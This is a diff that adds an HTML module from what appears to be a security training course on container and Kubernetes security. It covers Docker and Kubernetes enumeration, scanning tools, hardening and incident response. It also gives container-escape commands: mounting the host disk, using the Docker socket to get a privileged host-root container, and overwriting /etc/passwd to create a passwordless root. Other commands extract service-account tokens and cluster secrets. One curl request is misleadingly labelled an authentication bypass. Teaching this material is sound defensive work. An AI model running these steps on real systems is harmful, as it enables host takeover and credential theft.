@@ -1,0 +1,353 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 20: Container and Kubernetes Security</title>
+    <link rel="stylesheet" href="/modules/module-style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Module 20: Container and Kubernetes Security</h1>
+
+        <div class="image-container">
+            <img src="/images/container-security.jpg" alt="Container and Kubernetes Security" />
+        </div>
+
+        <h2>Learning Objectives</h2>
+        <ul>
+            <li>Understand containerization technology and security models</li>
+            <li>Learn Docker security vulnerabilities and attack vectors</li>
+            <li>Master Kubernetes security assessment techniques</li>
+            <li>Explore container escape and privilege escalation</li>
+            <li>Understand container registry and image security</li>
+        </ul>
+
+        <h2>Container Security Fundamentals</h2>
+        <p>
+            Container technology provides application isolation using operating system-level virtualization. 
+            Understanding the security implications of containers, orchestration platforms, and associated 
+            infrastructure is crucial for modern application security.
+        </p>
+
+        <h3>Container Architecture</h3>
+        <ul>
+            <li><strong>Container Engine:</strong> Docker, containerd, CRI-O</li>
+            <li><strong>Container Runtime:</strong> runc, kata-runtime, gVisor</li>
+            <li><strong>Container Images:</strong> Layered filesystem with application code</li>
+            <li><strong>Container Registry:</strong> Docker Hub, private registries</li>
+        </ul>
+
+        <h2>Docker Security Assessment</h2>
+        <h3>Docker Daemon Security</h3>
+        <pre><code># Docker daemon configuration check
+docker info
+docker version
+ps aux | grep docker
+
+# Docker socket exposure check
+ls -la /var/run/docker.sock
+netstat -tlnp | grep :2375
+netstat -tlnp | grep :2376</code></pre>
+
+        <h3>Container Enumeration</h3>
+        <pre><code># Container enumeration
+docker ps -a
+docker images
+docker network ls
+docker volume ls
+
+# Container inspection
+docker inspect container_id
+docker logs container_id
+docker exec -it container_id /bin/bash</code></pre>
+
+        <h3>Docker Vulnerabilities</h3>
+        <ul>
+            <li><strong>Privileged Containers:</strong> Full host access capabilities</li>
+            <li><strong>Docker Socket Exposure:</strong> Access to Docker daemon</li>
+            <li><strong>Weak Image Security:</strong> Vulnerable base images</li>
+            <li><strong>Resource Exhaustion:</strong> No resource limits</li>
+        </ul>
+
+        <h2>Container Escape Techniques</h2>
+        <h3>Privileged Container Escape</h3>
+        <pre><code># Check for privileged container
+grep -i privileged /proc/self/status
+capsh --print
+
+# Mount host filesystem
+mount /dev/sda1 /mnt
+chroot /mnt
+
+# Access host processes
+ps aux
+kill -9 process_id</code></pre>
+
+        <h3>Docker Socket Escape</h3>
+        <pre><code># Check Docker socket access
+ls -la /var/run/docker.sock
+
+# Create privileged container
+docker run -it --privileged --net=host --pid=host --ipc=host --volume /:/host alpine chroot /host</code></pre>
+
+        <h3>Capability-Based Escape</h3>
+        <pre><code># Check container capabilities
+capsh --print
+grep Cap /proc/self/status
+
+# SYS_ADMIN capability abuse
+mount -t tmpfs tmpfs /tmp
+mount --bind /tmp /etc
+echo "root::0:0:root:/root:/bin/bash" > /etc/passwd</code></pre>
+
+        <h2>Kubernetes Security Assessment</h2>
+        <h3>Kubernetes Architecture</h3>
+        <ul>
+            <li><strong>Master Components:</strong> API server, etcd, controller manager</li>
+            <li><strong>Node Components:</strong> kubelet, kube-proxy, container runtime</li>
+            <li><strong>Pod:</strong> Smallest deployable unit</li>
+            <li><strong>Service:</strong> Network access to pods</li>
+        </ul>
+
+        <h3>Kubernetes Enumeration</h3>
+        <pre><code># Cluster information
+kubectl cluster-info
+kubectl get nodes
+kubectl get namespaces
+kubectl get pods --all-namespaces
+
+# Service account enumeration
+kubectl get serviceaccounts --all-namespaces
+kubectl get clusterroles
+kubectl get clusterrolebindings</code></pre>
+
+        <h3>RBAC Analysis</h3>
+        <pre><code># Check current permissions
+kubectl auth can-i --list
+kubectl auth can-i create pods
+kubectl auth can-i get secrets
+
+# Service account token analysis
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace</code></pre>
+
+        <h2>Kubernetes Attack Techniques</h2>
+        <h3>API Server Attacks</h3>
+        <pre><code># API server enumeration
+curl -k https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods
+curl -k https://kubernetes.default.svc.cluster.local/api/v1/secrets
+
+# Authentication bypass
+curl -k https://kubernetes.default.svc.cluster.local/api/v1/namespaces/kube-system/secrets</code></pre>
+
+        <h3>Pod Security Context Abuse</h3>
+        <pre><code># Check pod security context
+kubectl get pod pod_name -o yaml | grep -A 10 securityContext
+
+# Privileged pod creation
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+spec:
+  containers:
+  - name: privileged-container
+    image: ubuntu
+    securityContext:
+      privileged: true
+      capabilities:
+        add: ["SYS_ADMIN"]</code></pre>
+
+        <h3>Secret Extraction</h3>
+        <pre><code># Secret enumeration
+kubectl get secrets --all-namespaces
+kubectl get secret secret_name -o yaml
+
+# Secret decoding
+echo "encoded_secret" | base64 -d
+
+# ConfigMap enumeration
+kubectl get configmaps --all-namespaces
+kubectl describe configmap config_name</code></pre>
+
+        <h2>Network Security Assessment</h2>
+        <h3>Network Policy Analysis</h3>
+        <pre><code># Network policy enumeration
+kubectl get networkpolicies --all-namespaces
+kubectl describe networkpolicy policy_name
+
+# Service enumeration
+kubectl get services --all-namespaces
+kubectl get endpoints --all-namespaces</code></pre>
+
+        <h3>Service Mesh Security</h3>
+        <ul>
+            <li><strong>Istio:</strong> Service mesh security configuration</li>
+            <li><strong>Linkerd:</strong> Lightweight service mesh</li>
+            <li><strong>Consul Connect:</strong> Service mesh for multi-cloud</li>
+        </ul>
+
+        <h2>Container Image Security</h2>
+        <h3>Image Vulnerability Scanning</h3>
+        <pre><code># Docker image scanning
+docker scan image_name
+trivy image image_name
+clair-scanner --ip localhost image_name
+
+# Image layer analysis
+docker history image_name
+dive image_name</code></pre>
+
+        <h3>Dockerfile Security Analysis</h3>
+        <pre><code># Dockerfile best practices check
+hadolint Dockerfile
+dockerfilelint Dockerfile
+
+# Image build analysis
+docker build --no-cache -t image_name .
+docker inspect image_name</code></pre>
+
+        <h2>Container Registry Security</h2>
+        <h3>Registry Authentication</h3>
+        <pre><code># Registry authentication
+docker login registry.example.com
+cat ~/.docker/config.json
+
+# Registry enumeration
+curl -X GET https://registry.example.com/v2/_catalog
+curl -X GET https://registry.example.com/v2/image_name/tags/list</code></pre>
+
+        <h3>Image Signing and Verification</h3>
+        <pre><code># Docker Content Trust
+export DOCKER_CONTENT_TRUST=1
+docker push image_name
+docker pull image_name
+
+# Notary image verification
+notary verify registry.example.com/image_name</code></pre>
+
+        <h2>Kubernetes Security Tools</h2>
+        <h3>Assessment Tools</h3>
+        <ul>
+            <li><strong>kube-hunter:</strong> Kubernetes penetration testing</li>
+            <li><strong>kube-bench:</strong> CIS Kubernetes benchmark</li>
+            <li><strong>Falco:</strong> Runtime security monitoring</li>
+            <li><strong>OPA Gatekeeper:</strong> Policy enforcement</li>
+        </ul>
+
+        <h3>Security Scanning</h3>
+        <pre><code># Kubernetes security scanning
+kube-hunter --remote cluster_ip
+kube-bench run --targets master,node
+
+# Pod security scanning
+kubectl run kube-hunter --image=aquasec/kube-hunter</code></pre>
+
+        <h2>Runtime Security Monitoring</h2>
+        <h3>Behavioral Analysis</h3>
+        <pre><code># Runtime behavior monitoring
+falco -r rules/falco_rules.yaml
+falco -K /var/log/audit.log
+
+# Container process monitoring
+docker stats
+docker top container_id</code></pre>
+
+        <h3>Security Policies</h3>
+        <ul>
+            <li><strong>Pod Security Standards:</strong> Baseline security requirements</li>
+            <li><strong>Network Policies:</strong> Traffic segmentation rules</li>
+            <li><strong>Resource Quotas:</strong> Resource usage limits</li>
+            <li><strong>Admission Controllers:</strong> Request validation</li>
+        </ul>
+
+        <h2>CI/CD Pipeline Security</h2>
+        <h3>Build Security</h3>
+        <pre><code># Secure build practices
+docker build --no-cache --security-opt no-new-privileges .
+docker run --read-only --tmpfs /tmp --user 1000:1000 image_name
+
+# Image signing in CI/CD
+docker trust sign image_name:tag
+cosign sign image_name:tag</code></pre>
+
+        <h3>Deployment Security</h3>
+        <ul>
+            <li><strong>Image Scanning:</strong> Vulnerability assessment in pipeline</li>
+            <li><strong>Policy Enforcement:</strong> Automated policy compliance</li>
+            <li><strong>Secrets Management:</strong> Secure secret injection</li>
+            <li><strong>Compliance Checks:</strong> Regulatory compliance validation</li>
+        </ul>
+
+        <h2>Container Security Best Practices</h2>
+        <h3>Image Security</h3>
+        <ul>
+            <li><strong>Minimal Base Images:</strong> Use distroless or minimal images</li>
+            <li><strong>Regular Updates:</strong> Keep base images updated</li>
+            <li><strong>Vulnerability Scanning:</strong> Automated security scanning</li>
+            <li><strong>Multi-stage Builds:</strong> Reduce attack surface</li>
+        </ul>
+
+        <h3>Runtime Security</h3>
+        <ul>
+            <li><strong>Non-root Users:</strong> Run containers as non-root</li>
+            <li><strong>Read-only Filesystems:</strong> Prevent runtime modifications</li>
+            <li><strong>Resource Limits:</strong> Prevent resource exhaustion</li>
+            <li><strong>Security Contexts:</strong> Proper security configurations</li>
+        </ul>
+
+        <h2>Kubernetes Security Hardening</h2>
+        <h3>Control Plane Security</h3>
+        <ul>
+            <li><strong>API Server:</strong> Authentication and authorization</li>
+            <li><strong>etcd:</strong> Encryption at rest and in transit</li>
+            <li><strong>Controller Manager:</strong> Secure communication</li>
+            <li><strong>Scheduler:</strong> Secure scheduling policies</li>
+        </ul>
+
+        <h3>Node Security</h3>
+        <ul>
+            <li><strong>kubelet:</strong> Secure configuration and authentication</li>
+            <li><strong>Container Runtime:</strong> Secure runtime configuration</li>
+            <li><strong>Host Security:</strong> OS hardening and monitoring</li>
+        </ul>
+
+        <h2>Compliance and Governance</h2>
+        <h3>Security Standards</h3>
+        <ul>
+            <li><strong>CIS Benchmarks:</strong> Configuration security guidelines</li>
+            <li><strong>NIST SP 800-190:</strong> Container security guidance</li>
+            <li><strong>PCI DSS:</strong> Payment card industry compliance</li>
+            <li><strong>SOC 2:</strong> Security operational controls</li>
+        </ul>
+
+        <h2>Incident Response</h2>
+        <h3>Container Incident Handling</h3>
+        <ol>
+            <li><strong>Detection:</strong> Anomaly detection and alerting</li>
+            <li><strong>Containment:</strong> Isolate affected containers</li>
+            <li><strong>Analysis:</strong> Forensic analysis of containers</li>
+            <li><strong>Recovery:</strong> Restore clean container images</li>
+            <li><strong>Lessons Learned:</strong> Improve security posture</li>
+        </ol>
+
+        <h2>Conclusion</h2>
+        <p>
+            Container and Kubernetes security requires understanding of the entire container lifecycle, 
+            from image creation to runtime execution. The dynamic nature of containerized environments 
+            presents unique security challenges that require specialized tools and techniques.
+        </p>
+
+        <div class="highlight">
+            <strong>Remember:</strong> Container security is a shared responsibility between development, 
+            operations, and security teams. Implementing security throughout the container lifecycle 
+            is essential for maintaining a strong security posture.
+        </div>
+
+        <h2>Next Steps</h2>
+        <p>In the next module, we'll explore API security testing, learning how to assess REST and GraphQL APIs for security vulnerabilities.</p>
+    </div>
+</body>
+</html>
